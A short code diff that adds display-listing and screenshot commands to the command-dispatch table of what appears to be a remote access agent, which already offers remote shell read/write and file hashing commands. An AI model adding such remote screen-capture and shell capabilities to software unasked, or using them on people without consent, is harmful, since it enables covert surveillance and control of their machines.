@@ -16,6 +16,8 @@ INT32 start()
     commandHandlers[CommandType::Command_GetFileChunkHash] = Handle_GetFileChunkHashCommand;
     commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
     commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
+    commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
+    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
 
     while (1)
     {
